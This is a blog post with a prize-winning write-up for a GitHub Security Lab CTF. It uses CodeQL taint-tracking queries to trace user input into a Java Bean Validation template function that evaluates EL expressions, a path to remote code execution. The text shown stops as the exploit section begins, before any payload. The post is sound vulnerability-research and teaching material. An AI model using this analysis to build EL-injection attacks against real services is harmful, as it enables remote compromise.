<!DOCTYPE html>
<html lang="en">

  <head>

  <title>
    
      GitHub CTF CodeQL and Chill | Kanav Gupta
    
  </title>

  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  <meta name="description" content="About, Blog and Projects of Kanav" />

  <link
    rel="stylesheet"
    href="/static/styles/main.css"
  />

  <link
    rel="shortcut icon"
    href="/static/assets/favicon.ico"
    type="image/x-icon"
  />

  <link
    rel="alternate"
    type="application/atom+xml"
    title="Kanav Gupta"
    href="/feed.xml"
  />

</head>


  <body>

    <header>

  <div>

    <div class="header-heading">
      <a
        href="/"
        class="header-heading-title"
      >
        Kanav
      </a>
      <div class="header-heading-context">
        <p>Software Developer</p>
        <p>@kanav99</p>
      </div>
    </div>

    <div class="header-nav">
      
        <p>
          <a
            href="/about/"
            target=""
          >
            About
          </a>
        </p>
      
        <p>
          <a
            href="/projects/"
            target=""
          >
            Projects
          </a>
        </p>
      
        <p>
          <a
            href="/blog/"
            target=""
          >
            Blog
          </a>
        </p>
      
        <p>
          <a
            href="/static/assets/resume.pdf"
            target="_blank"
          >
            Resume
          </a>
        </p>
      
    </div>

  </div>

  <div class="header-contact">
    
      <a href="mailto:kanav0610@gmail.com" target="_blank">
        <div class="img">
          <?xml version="1.0" encoding="iso-8859-1"?>
<!-- Generator: Adobe Illustrator 17.1.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 442 442" style="enable-background:new 0 0 442 442;" xml:space="preserve">
<path d="M442,360.75V81.25c0-5.175-1.992-9.881-5.229-13.436c-0.049-0.058-0.104-0.113-0.155-0.171
	c-3.654-3.922-8.846-6.393-14.616-6.393H20c-5.763,0-10.949,2.465-14.602,6.378c-0.056,0.064-0.117,0.125-0.172,0.189
	C1.991,71.372,0,76.077,0,81.25v279.5c0,5.176,1.993,9.884,5.231,13.439c0.044,0.053,0.094,0.102,0.14,0.154
	c3.654,3.93,8.852,6.407,14.629,6.407h402c5.77,0,10.962-2.471,14.616-6.393c0.051-0.058,0.106-0.112,0.155-0.171
	C440.008,370.631,442,365.925,442,360.75z M98.04,279.059c-3.983-3.825-10.314-3.696-14.139,0.288L20,345.897V96.103L139.924,221
	l-32.395,33.739c-3.825,3.983-3.696,10.314,0.288,14.139c1.938,1.861,4.433,2.787,6.924,2.787c2.627,0,5.251-1.029,7.215-3.074
	l31.832-33.152l46.147,48.061c5.588,5.82,13.069,9.025,21.065,9.025s15.477-3.206,21.065-9.025l46.147-48.061L408.535,360.75H33.465
	l64.862-67.552C102.152,289.215,102.023,282.884,98.04,279.059z M227.639,269.648c-1.781,1.855-4.139,2.877-6.639,2.877
	s-4.857-1.022-6.639-2.877L33.465,81.25h375.069L227.639,269.648z M302.076,221L422,96.103l0.002,249.797L302.076,221z"/>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
</svg>

        </div>
      </a>
    
      <a href="https://github.com/kanav99" target="_blank">
        <div class="img">
          <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="m256 0c-140.699219 0-256 116.300781-256 257 0 139.882812 114.25 255 256 255 141.574219 0 256-114.945312 256-255 0-140.699219-115.300781-257-256-257zm45 477.5c-14.398438 3-29.699219 4.5-45 4.5s-30.601562-1.5-45-4.5v-70.199219c0-16.800781 4.5-22.800781 10.5-30.902343 3.054688-3.492188 4.898438-6.625 18.597656-27.296876l-23.097656-3.601562c-59.402344-8.699219-82.800781-39.601562-92.101562-63.601562-12-32.097657-5.699219-72.300782 15.902343-97.796876 3.300781-3.902343 6-10.503906 3.601563-17.402343-4.503906-13.800781-3.902344-35.699219-.902344-44.101563 15.90625 2.273438 32.261719 13.667969 45.902344 21.902344 6.285156 3.667969 9.582031 2.699219 12.597656 3 10.960938-2.28125 28.058594-7.800781 54.300781-7.800781 16.199219 0 33.300781 2.398437 50.101563 7.199219 3.003906-.070313 7.832031 2.484374 16.199218-2.398438 14.257813-8.6875 30.058594-19.691406 45.898438-21.902344 3 8.402344 3.601562 30.300782-.898438 44.101563-2.402343 6.898437.296876 13.5 3.601563 17.402343 21.597656 25.5 27.898437 65.699219 15.898437 97.796876-9.300781 24-32.699218 54.902343-92.101562 63.601562l-23.097656 3.601562c14.160156 21.367188 15.652344 23.929688 18.601562 27.296876 5.996094 8.101562 10.496094 14.101562 10.496094 30.902343zm30-8.699219v-61.5c0-17.101562-3.601562-28.5-8.402344-36.902343 45.601563-12.296876 78.003906-39.300782 92.402344-78 15.300781-40.796876 8.402344-89.398438-17.101562-123 4.503906-20.097657 4.503906-52.199219-6.296876-67.199219-4.800781-6.597657-11.402343-10.199219-19.800781-10.199219-.300781 0-.300781 0-.300781 0-23.261719 1.257812-41.570312 12.972656-61.199219 24.898438-18-4.800782-36.300781-7.199219-54.601562-7.199219-18.597657 0-37.199219 2.699219-53.695313 7.199219-20.664062-12.460938-38.796875-23.671876-62.703125-24.898438-7.5 0-14.101562 3.601562-18.902343 10.199219-10.796876 15-10.796876 47.101562-6.296876 67.199219-25.503906 33.601562-32.402343 82.5-17.101562 123 14.398438 38.699218 46.800781 65.703124 92.402344 78-3.722656 6.511718-6.667969 14.914062-7.828125 26.285156-9.210938 3.175781-17.199219 4.210937-24.628907 2.027344-7.835937-2.316407-13.941406-7.546876-19.246093-16.46875-11.914063-20.015626-32.207031-36.355469-55.3125-34.230469l2.636719 29.882812c10.699218-.980469 21.347656 10.339844 26.878906 19.671875 9.125 15.367188 21.417968 25.445313 36.546875 29.914063 11.230469 3.308593 21.496093 3.230469 32.550781.871093v40.449219c-87.300781-30.601562-151-114-151-211.800781 0-124.199219 101.800781-227 226-227s226 102.800781 226 227c0 97.800781-63.699219 181.199219-151 211.800781zm0 0"/></svg>
        </div>
      </a>
    
      <a href="https://twitter.com/kanavgupta99" target="_blank">
        <div class="img">
          <svg viewBox="0 -47 512.00004 512" xmlns="http://www.w3.org/2000/svg"><path d="m512 55.964844c-32.207031 1.484375-31.503906 1.363281-35.144531 1.667968l19.074219-54.472656s-59.539063 21.902344-74.632813 25.820313c-39.640625-35.628907-98.5625-37.203125-140.6875-11.3125-34.496094 21.207031-53.011719 57.625-46.835937 100.191406-67.136719-9.316406-123.703126-41.140625-168.363282-94.789063l-14.125-16.964843-10.554687 19.382812c-13.339844 24.492188-17.769531 52.496094-12.476563 78.851563 2.171875 10.8125 5.863282 21.125 10.976563 30.78125l-12.117188-4.695313-1.4375 20.246094c-1.457031 20.566406 5.390625 44.574219 18.320313 64.214844 3.640625 5.53125 8.328125 11.605469 14.269531 17.597656l-6.261719-.960937 7.640625 23.199218c10.042969 30.480469 30.902344 54.0625 57.972657 67.171875-27.035157 11.472657-48.875 18.792969-84.773438 30.601563l-32.84375 10.796875 30.335938 16.585937c11.566406 6.324219 52.4375 27.445313 92.820312 33.78125 89.765625 14.078125 190.832031 2.613282 258.871094-58.664062 57.308594-51.613282 76.113281-125.03125 72.207031-201.433594-.589844-11.566406 2.578125-22.605469 8.921875-31.078125 12.707031-16.964844 48.765625-66.40625 48.84375-66.519531zm-72.832031 48.550781c-10.535157 14.066406-15.8125 32.03125-14.867188 50.578125 3.941407 77.066406-17.027343 136.832031-62.328125 177.628906-52.917968 47.660156-138.273437 66.367188-234.171875 51.324219-17.367187-2.722656-35.316406-8.820313-50.171875-14.910156 30.097656-10.355469 53.339844-19.585938 90.875-37.351563l52.398438-24.800781-57.851563-3.703125c-27.710937-1.773438-50.785156-15.203125-64.96875-37.007812 7.53125-.4375 14.792969-1.65625 22.023438-3.671876l55.175781-15.367187-55.636719-13.625c-27.035156-6.621094-42.445312-22.796875-50.613281-35.203125-5.363281-8.152344-8.867188-16.503906-10.96875-24.203125 5.578125 1.496094 12.082031 2.5625 22.570312 3.601563l51.496094 5.09375-40.800781-31.828126c-29.398437-22.929687-41.179687-57.378906-32.542969-90.496093 91.75 95.164062 199.476563 88.011719 210.320313 90.527343-2.386719-23.183593-2.449219-23.238281-3.074219-25.445312-13.886719-49.089844 16.546875-74.015625 30.273438-82.453125 28.671874-17.621094 74.183593-20.277344 105.707031 8.753906 6.808593 6.265625 16.015625 8.730469 24.632812 6.589844 7.734375-1.921875 14.082031-3.957031 20.296875-6.171875l-12.9375 36.945312 16.515625.011719c-3.117187 4.179688-6.855469 9.183594-11.351562 15.183594zm0 0"/></svg>
        </div>
      </a>
    
      <a href="https://www.linkedin.com/in/kanav99/" target="_blank">
        <div class="img">
          <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="m437 0h-362c-41.355469 0-75 33.644531-75 75v362c0 41.355469 33.644531 75 75 75h362c41.355469 0 75-33.644531 75-75v-362c0-41.355469-33.644531-75-75-75zm45 437c0 24.8125-20.1875 45-45 45h-362c-24.8125 0-45-20.1875-45-45v-362c0-24.8125 20.1875-45 45-45h362c24.8125 0 45 20.1875 45 45zm0 0"/><path d="m91 422h90v-212h-90zm30-182h30v152h-30zm0 0"/><path d="m331.085938 210c-.027344 0-.058594 0-.085938 0-10.371094 0-20.472656 1.734375-30 5.101562v-5.101562h-90v212h90v-107c0-8.269531 6.730469-15 15-15s15 6.730469 15 15v107h90v-117.3125c0-48.546875-39.382812-94.640625-89.914062-94.6875zm59.914062 182h-30v-77c0-24.8125-20.1875-45-45-45s-44.996094 20.1875-45 44.996094v77.003906h-30v-152h30v30.019531l24.007812-18.03125c10.441407-7.84375 22.886719-11.988281 35.992188-11.988281h.058594c31.929687.03125 59.941406 30.257812 59.941406 64.6875zm0 0"/><path d="m91 180h90v-90h-90zm30-60h30v30h-30zm0 0"/></svg>
        </div>
      </a>
    
  </div>

</header>


<div class="container">

  <div class="menu-btn nozoom">
    <?xml version="1.0" encoding="iso-8859-1"?>
<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve">
<g transform="translate(1 1)">
	<g>
		<g>
			<path d="M255-1C113.618-1-1,113.618-1,255s114.618,256,256,256s256-114.618,256-256S396.382-1,255-1z M255,468.333
				c-117.818,0-213.333-95.515-213.333-213.333S137.182,41.667,255,41.667S468.333,137.182,468.333,255S372.818,468.333,255,468.333
				z"/>
			<path d="M361.667,148.333H148.333c-11.782,0-21.333,9.551-21.333,21.333c0,11.782,9.551,21.333,21.333,21.333h213.333
				c11.782,0,21.333-9.551,21.333-21.333C383,157.885,373.449,148.333,361.667,148.333z"/>
			<path d="M361.667,233.667H148.333C136.551,233.667,127,243.218,127,255s9.551,21.333,21.333,21.333h213.333
				c11.782,0,21.333-9.551,21.333-21.333S373.449,233.667,361.667,233.667z"/>
			<path d="M361.667,319H148.333C136.551,319,127,328.551,127,340.333c0,11.782,9.551,21.333,21.333,21.333h213.333
				c11.782,0,21.333-9.551,21.333-21.333C383,328.551,373.449,319,361.667,319z"/>
		</g>
	</g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
</svg>

  </div>

  <div class="main-cover"></div>

  <main>

    <h1>
      GitHub CTF CodeQL and Chill
      
    </h1>

    <p class="blog-post-date">Posted on 25 Jun 2020</p>

<p>Submission for the GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition</p>

<p><em>UPDATE</em>: This entry won the first prize :tada:</p>

<p>Table of Contents -</p>
<ul>
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#step-1-data-flow-and-taint-tracking-analysis">Step 1: Data Flow and Taint Tracking Analysis</a>
    <ul>
      <li><a href="#11-sources">1.1 Sources</a></li>
      <li><a href="#12-sink">1.2 Sink</a></li>
      <li><a href="#13-tainttracking-configuration">1.3 TaintTracking Configuration</a></li>
      <li><a href="#14-partial-flow-to-the-rescue">1.4 Partial Flow to the rescue</a></li>
      <li><a href="#15-identifying-a-missing-taint-step">1.5 Identifying a missing taint step</a></li>
      <li><a href="#16-adding-additional-taint-steps">1.6 Adding additional taint steps</a></li>
      <li><a href="#17-adding-taint-steps-through-a-constructor">1.7 Adding taint steps through a constructor</a></li>
    </ul>
  </li>
  <li><a href="#step-2-second-issue">Step 2: Second Issue</a></li>
  <li><a href="#step-3-errors-and-exceptions">Step 3: Errors and Exceptions</a></li>
  <li><a href="#step-4-exploit-and-remedition">Step 4: Exploit and Remedition</a>
    <ul>
      <li><a href="#lowercase-remedy">Lowercase Remedy</a></li>
      <li><a href="#final-payload">Final Payload</a></li>
      <li><a href="#41-poc-reproducing-vulnerability-locally">4.1 PoC: Reproducing vulnerability locally</a></li>
      <li><a href="#42-remediation">4.2 Remediation</a></li>
    </ul>
  </li>
  <li><a href="#ending-remarks-and-feedback">Ending remarks and Feedback</a></li>
</ul>
      <h2 id="introduction">
        
        
          Introduction <a href="#introduction" class="anchor-heading">#</a>
        
        
      </h2>
    

<p>The challenge introduction aptly summarizes the issue: user controlled data being passed into the Bean Validation library function <code class="language-plaintext highlighter-rouge">ConstraintValidatorContext.buildConstraintViolationWithTemplate</code> which supports Java EL Expressions. Hence, remote code execution. That might seem to be the end of the issue, but it isn’t. Getting an RCE wasn’t as easy as just passing an EL expression. Some issues like lowercasing of the user input stopped us from getting the exploit. In this report I explain how I found specific user controlled data which flows into the target function using CodeQL, assess what requirements we have for a successful remote code execution and finally I present the exploit.</p>
      <h2 id="step-1-data-flow-and-taint-tracking-analysis">
        
        
          Step 1: Data Flow and Taint Tracking Analysis <a href="#step-1-data-flow-and-taint-tracking-analysis" class="anchor-heading">#</a>
        
        
      </h2>
    
      <h3 id="11-sources">
        
        
          1.1 Sources <a href="#11-sources" class="anchor-heading">#</a>
        
        
      </h3>
    

<p>An important part of finding the exploit is finding where all the user controlled data can come from. A good starting point is explained in the challenge page itself - first formal parameter to the function <code class="language-plaintext highlighter-rouge">isValid</code>.</p>

<p>So the predicate to this is quiet straight forward</p>

<pre><code class="language-codeql">class TypeConstraintValidator extends GenericInterface {
  TypeConstraintValidator() { hasQualifiedName("javax.validation", "ConstraintValidator") }
}

predicate isSource(DataFlow::Node source) { 
    exists(Method m, ParameterizedInterface p |
        source.asParameter() = m.getParameter(0) and
        m.hasName("isValid") and 
        m.getDeclaringType().hasSupertype(p) and
        p.getSourceDeclaration() instanceof TypeConstraintValidator
    )
}
</code></pre>

<p>In this snippet, class <code class="language-plaintext highlighter-rouge">TypeConstraintValidator</code> the interface <code class="language-plaintext highlighter-rouge">javax.validation.ConstraintValidator</code>. To explain the query, we want such sources for which, there exists such method whose first paramenter is the node itself, and name of the method is <code class="language-plaintext highlighter-rouge">isValid</code> and the method is a part of a class which extends <code class="language-plaintext highlighter-rouge">javax.validation.ConstraintValidator</code>.</p>

<p><img src="/static/assets/codeql/1.1.1.png" alt="" /></p>

<p>We see 8 results, but 2 out of these 8 don’t override the <code class="language-plaintext highlighter-rouge">isValid</code> provided by the interface <code class="language-plaintext highlighter-rouge">javax.validation.ConstraintValidator</code>. We filter them out using this following query (and using better variable names) -</p>

<pre><code class="language-codeql">predicate isSource(DataFlow::Node source) { 
  exists(Method isValid, ParameterizedInterface originalConstrainValidator, Method originalIsValid |
      source.asParameter() = isValid.getParameter(0) and
      isValid.hasName("isValid") and 
      isValid.getDeclaringType().hasSupertype(originalConstrainValidator) and
      originalConstrainValidator.getSourceDeclaration() instanceof TypeConstraintValidator and
      originalIsValid.hasName("isValid") and
      originalIsValid.getDeclaringType() = originalConstrainValidator and
      isValid.overrides(originalIsValid)
  )
}
</code></pre>

<p><img src="/static/assets/codeql/1.1.2.png" alt="" /></p>

<p><br />
<br /></p>

<p><em>NOTE</em>: I attempted the bonus part too, it’s writeup is present in the file <a href="https://github.com/kanav99/github-java-ctf/tree/master/bonus.md">bonus.md</a>. Do check it out if the submissions are close enough!</p>
      <h3 id="12-sink">
        
        
          1.2 Sink <a href="#12-sink" class="anchor-heading">#</a>
        
        
      </h3>
    

<p>As we know where the actual vulnerability exists, i.e. <code class="language-plaintext highlighter-rouge">buildConstraintViolationWithTemplate</code>, writing the sink was trivial.</p>

<pre><code class="language-codeql">predicate isSink(DataFlow::Node sink) { 
  exists(MethodAccess sinkFunction, Interface constraintValidatorContext | 
    sink.asExpr() = sinkFunction.getArgument(0) and
    sinkFunction.getMethod().hasName("buildConstraintViolationWithTemplate") and
    sinkFunction.getQualifier().getType() = constraintValidatorContext and
    constraintValidatorContext.hasQualifiedName("javax.validation", "ConstraintValidatorContext")
  )
}
</code></pre>

<p>That is, we want all nodes which are first argument to a method call whose name is <code class="language-plaintext highlighter-rouge">buildConstraintViolationWithTemplate</code> and it should be called by a qualifier of type <code class="language-plaintext highlighter-rouge">javax.validation.ConstraintValidatorContext</code>.</p>

<p><img src="/static/assets/codeql/1.2.1.png" alt="" /></p>

<p>We get the expected results.</p>
      <h3 id="13-tainttracking-configuration">
        
        
          1.3 TaintTracking Configuration <a href="#13-tainttracking-configuration" class="anchor-heading">#</a>
        
        
      </h3>
    

<p>We have our sources and sinks ready. We now run the full taint tracking query to find all the taint flow paths.</p>

<pre><code class="language-codeql">/** 
* @kind path-problem 
*/
import java
import semmle.code.java.dataflow.TaintTracking
import DataFlow::PathGraph

class TypeConstraintValidator extends GenericInterface {
  TypeConstraintValidator() { hasQualifiedName("javax.validation", "ConstraintValidator") }
}

class MyTaintTrackingConfig extends TaintTracking::Configuration {
    MyTaintTrackingConfig() { this = "MyTaintTrackingConfig" }

    override predicate isSource(DataFlow::Node source) { 
      exists(Method isValid, ParameterizedInterface originalConstrainValidator, Method originalIsValid |
          source.asParameter() = isValid.getParameter(0) and
          isValid.hasName("isValid") and 
          isValid.getDeclaringType().hasSupertype(originalConstrainValidator) and
          originalConstrainValidator.getSourceDeclaration() instanceof TypeConstraintValidator and
          originalIsValid.hasName("isValid") and
          originalIsValid.getDeclaringType() = originalConstrainValidator and
          isValid.overrides(originalIsValid)
      )
    }

    override predicate isSink(DataFlow::Node sink) { 
      exists(MethodAccess sinkFunction, Interface constraintValidatorContext | 
        sink.asExpr() = sinkFunction.getArgument(0) and
        sinkFunction.getMethod().hasName("buildConstraintViolationWithTemplate") and
        sinkFunction.getQualifier().getType() = constraintValidatorContext and
        constraintValidatorContext.hasQualifiedName("javax.validation", "ConstraintValidatorContext")
      )
    }
}

from MyTaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink, source, sink, "Custom constraint error message contains unsanitized user data"
</code></pre>

<p>And as mentioned in the challenge page, I get 0 results.</p>
      <h3 id="14-partial-flow-to-the-rescue">
        
        
          1.4 Partial Flow to the rescue <a href="#14-partial-flow-to-the-rescue" class="anchor-heading">#</a>
        
        
      </h3>
    

<p>To debug why we get no result, we use Partial Flow analysis. We know that we have a vulnerability in the file <code class="language-plaintext highlighter-rouge">SchedulingContraintSetValidator.java</code>, so we set the source to the formal parameter of this method.</p>

<pre><code class="language-codeql">/** 
* @kind path-problem 
*/
import java
import semmle.code.java.dataflow.TaintTracking
import DataFlow::PartialPathGraph

class TypeConstraintValidator extends GenericInterface {
  TypeConstraintValidator() { hasQualifiedName("javax.validation", "ConstraintValidator") }
}

class MyTaintTrackingConfig extends TaintTracking::Configuration {
    MyTaintTrackingConfig() { this = "MyTaintTrackingConfig" }

    override predicate isSource(DataFlow::Node source) { 
      exists(Method isValid, ParameterizedInterface originalConstrainValidator, Method originalIsValid |
          source.asParameter() = isValid.getParameter(0) and
          isValid.hasName("isValid") and 
          isValid.getDeclaringType().hasSupertype(originalConstrainValidator) and
          originalConstrainValidator.getSourceDeclaration() instanceof TypeConstraintValidator and
          originalIsValid.hasName("isValid") and
          originalIsValid.getDeclaringType() = originalConstrainValidator and
          isValid.overrides(originalIsValid)
      )
    }

    override predicate isSink(DataFlow::Node sink) { 
      exists(MethodAccess sinkFunction, Interface constraintValidatorContext | 
        sink.asExpr() = sinkFunction.getArgument(0) and
        sinkFunction.getMethod().hasName("buildConstraintViolationWithTemplate") and
        sinkFunction.getQualifier().getType() = constraintValidatorContext and
        constraintValidatorContext.hasQualifiedName("javax.validation", "ConstraintValidatorContext")
      )
    }
}

from MyTaintTrackingConfig cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink
where
  cfg.hasPartialFlow(source, sink, _) and
  exists(Method m | 
    source.getNode().asParameter() = m.getParameter(0) and
    m.getParameter(0).getType().hasName("Container")
  )
select sink, source, sink, "Partial flow from unsanitized user data"
</code></pre>

<p>In the output, we see that flow stops at the return statement of the getters like <code class="language-plaintext highlighter-rouge">getSoftConstraints</code> and <code class="language-plaintext highlighter-rouge">getHardConstraints</code>.</p>
      <h3 id="15-identifying-a-missing-taint-step">
        
        
          1.5 Identifying a missing taint step <a href="#15-identifying-a-missing-taint-step" class="anchor-heading">#</a>
        
        
      </h3>
    

<p>As we see in the last step, the code doesn’t propagate through the getters. My best bet why this happens is because getters not always point to tainted data. They often point to some static variables, which are not tainted.</p>
      <h3 id="16-adding-additional-taint-steps">
        
        
          1.6 Adding additional taint steps <a href="#16-adding-additional-taint-steps" class="anchor-heading">#</a>
        
        
      </h3>
    

<p>We need to step through the getters as explained in the last step. For this, we add an addition step where we step from a method access to it’s qualifier. As suggested in the challenge, we extend <code class="language-plaintext highlighter-rouge">TaintTracking::AdditionalTaintStep</code>.</p>

<pre><code class="language-codeql">class CustomStepper extends TaintTracking::AdditionalTaintStep {
  override predicate step(DataFlow::Node pred, DataFlow::Node succ) {
    exists(MethodAccess callToGetter, GetterMethod getterMethod |
        succ.asExpr() = callToGetter and
        pred.asExpr() = callToGetter.getQualifier() and
        callToGetter.getCallee() = getterMethod
    )
  }
}

</code></pre>
<p>We restrict our step only through the getter methods, not through general methods. Note that we can also step through only the <code class="language-plaintext highlighter-rouge">getSoftConstraints</code> and <code class="language-plaintext highlighter-rouge">getHardConstraints</code> but it is good idea to first start with all getters so that we atleast not miss a case. In the output we see that</p>

<p><img src="/static/assets/codeql/1.6.1.png" alt="" /></p>

<p>We don’t step through <code class="language-plaintext highlighter-rouge">keySet()</code> method. So we must step through this method too.</p>

<pre><code class="language-codeql">class CustomStepper extends TaintTracking::AdditionalTaintStep {
  override predicate step(DataFlow::Node pred, DataFlow::Node succ) {
    exists(MethodAccess ma, GetterMethod m |
        succ.asExpr() = ma and
        pred.asExpr() = ma.getQualifier() and
        ma.getCallee() = m
    ) or
    exists(MethodAccess callToMethod |
        succ.asExpr() = callToMethod and
        pred.asExpr() = callToMethod.getQualifier() and
        callToMethod.getMethod().getName() = "keySet"
    )
  }
}
</code></pre>

<p><img src="/static/assets/codeql/1.6.2.png" alt="" /></p>

<p>This time, the flow stops at the HashSet Constructor.</p>
      <h3 id="17-adding-taint-steps-through-a-constructor">
        
        
          1.7 Adding taint steps through a constructor <a href="#17-adding-taint-steps-through-a-constructor" class="anchor-heading">#</a>
        
        
      </h3>
    

<p>We just join the two conditions, i.e. through getters and through constructors.</p>

<pre><code class="language-codeql">class CustomStepper extends TaintTracking::AdditionalTaintStep {
  override predicate step(DataFlow::Node pred, DataFlow::Node succ) {
    exists(MethodAccess ma, GetterMethod m |
        succ.asExpr() = ma and
        pred.asExpr() = ma.getQualifier() and
        ma.getCallee() = m
    ) or
    exists(MethodAccess callToMethod |
        succ.asExpr() = callToMethod and
        pred.asExpr() = callToMethod.getQualifier() and
        callToMethod.getMethod().getName() = "keySet"
    ) or
    exists(ConstructorCall callToConstructor |
        succ.asExpr() = callToConstructor and
        callToConstructor.getArgument(0) = pred.asExpr() and
        callToConstructor.getConstructedType().getErasure().(Class).hasQualifiedName("java.util", "HashSet")
    )
  }
}
</code></pre>

<p>Hurray :tada:! We reached our final destination function. We have fixed the steps for the <code class="language-plaintext highlighter-rouge">SchedulingConstraintSetValidator.java</code> file. Other files to go!</p>
      <h2 id="step-2-second-issue">
        
        
          Step 2: Second Issue <a href="#step-2-second-issue" class="anchor-heading">#</a>
        
        
      </h2>
    

<p>To find the issue in the file <code class="language-plaintext highlighter-rouge">SchedulingConstraintValidator.java</code>, we use the same configuration but with modified query</p>

<pre><code class="language-codeql">from MyTaintTrackingConfig cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink
where
  cfg.hasPartialFlow(source, sink, _) and
  exists(Method m | 
    source.getNode().asParameter() = m.getParameter(0) and
    m.getDeclaringType().getName() = "SchedulingConstraintValidator"
  )
select sink, source, sink, "Partial flow from unsanitized user data"
</code></pre>

<p><img src="/static/assets/codeql/2.1.png" alt="" /></p>

<p>The flow stops at <code class="language-plaintext highlighter-rouge">keySet()</code> call. We need to make it step through <code class="language-plaintext highlighter-rouge">stream()</code>, <code class="language-plaintext highlighter-rouge">map(...)</code> and <code class="language-plaintext highlighter-rouge">collect(...)</code>.</p>

<pre><code class="language-codeql">class CustomStepper extends TaintTracking::AdditionalTaintStep {
  override predicate step(DataFlow::Node pred, DataFlow::Node succ) {
    exists(MethodAccess callToGetter, GetterMethod getterMethod |
        succ.asExpr() = callToGetter and
        pred.asExpr() = callToGetter.getQualifier() and
        callToGetter.getCallee() = getterMethod
    ) or
    exists(MethodAccess callToMethod |
        succ.asExpr() = callToMethod and
        pred.asExpr() = callToMethod.getQualifier() and
        (callToMethod.getMethod().getName() in ["keySet", "stream", "map", "collect"] )
    ) or
    exists(ConstructorCall callToConstructor |
        succ.asExpr() = callToConstructor and
        callToConstructor.getArgument(0) = pred.asExpr() and
        callToConstructor.getConstructedType().getErasure().(Class).hasQualifiedName("java.util", "HashSet")
    )
  }
}
</code></pre>

<p>Our flow reaches the target function :tada:</p>
      <h2 id="step-3-errors-and-exceptions">
        
        
          Step 3: Errors and Exceptions <a href="#step-3-errors-and-exceptions" class="anchor-heading">#</a>
        
        
      </h2>
    
<p>As stated in the challenge, we have to make a custom step such that if we see a code like this</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span> <span class="o">{</span>
    <span class="n">parse</span><span class="o">(</span><span class="n">tainted</span><span class="o">);</span>
<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">sink</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">())</span>
<span class="o">}</span>
</code></pre></div></div>

<p>we should step from <code class="language-plaintext highlighter-rouge">tainted</code> to <code class="language-plaintext highlighter-rouge">e.getMessage()</code>, subject to some conditions like the function that the <code class="language-plaintext highlighter-rouge">tainted</code> variable/expression is passed into should throw a throwable which can be caught by the respective catch clause, the message should be written by the successor expression (using methods like <code class="language-plaintext highlighter-rouge">getMessage()</code>). So the query I could write is this -</p>

<pre><code class="language-codeql">class TryCatchStepper extends TaintTracking::AdditionalTaintStep {
  override predicate step(DataFlow::Node pred, DataFlow::Node succ) {
    exists(TryStmt t, CatchClause c, MethodAccess throwingCall, MethodAccess errorWriter |
      // connect try and catch
      c.getTry() = t and
      // in catch, the method access would be the successor...
      errorWriter = succ.asExpr() and
      // restricting to those methods that write something
      (
        errorWriter.getMethod().getName() in [
          "getMessage", "getStackTrace",
          "getSuppressed", "toString",
          "getLocalizedMessage" ] or
        errorWriter.getMethod().getName().prefix(3) = "get" or
        errorWriter.getMethod() instanceof GetterMethod
      ) and
      // and it's qualifier should be the error variable.
      c.getVariable().getAnAccess() = errorWriter.getQualifier() and
      // predecessor would be an argument of a method access...
      throwingCall.getAnArgument() = pred.asExpr() and
      // which is contained in the try statement
      throwingCall.getEnclosingStmt().getParent*() = t.getBlock() and
      // and the method should throw some subtype of the caught clause type
      throwingCall.getMethod().getAThrownExceptionType().getASupertype*() = c.getACaughtType() and
      // because it shows so many false positives.
      not pred.asExpr() instanceof Literal
    )
  }
}
</code></pre>

<p>(I admit that <code class="language-plaintext highlighter-rouge">errorWriter.getMethod().getName().prefix(3) = "get"</code> is too general, but it helps when you don’t know the inner implementation of the getter. Also, we can make it specific to our case later according to our project)</p>

<p>As challenge states, I couldn’t get any additional paths due to this addition. But on quick evaluation I get completely right results.</p>

<p><img src="/static/assets/codeql/3.1.png" alt="" /></p>

<p>Final query (without bonus part) is available in the file <img src="https://github.com/kanav99/github-java-ctf/tree/master/queries/final.ql" alt="final.ql" />.</p>
      <h2 id="step-4-exploit-and-remedition">
        
        
          Step 4: Exploit and Remedition <a href="#step-4-exploit-and-remedition" class="anchor-heading">#</a>
        
        
      </h2>
    

<p>First step towards a successful exploit is setting up a development environment. I set up the project on Docker using the <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> and tweaked the Dockerfiles to fire up debugging in IntelliJ IDEA.</p>

<p>First glance at the files <code class="language-plaintext highlighter-rouge">SchedulingConstraintValidator.java</code> and <code class="language-plaintext highlighter-rouge">SchedulingConstraintSetValidator.java</code> suggest that the keys of the dictonaries are passed into the template builder function. That’s were our EL expression will go.</p>

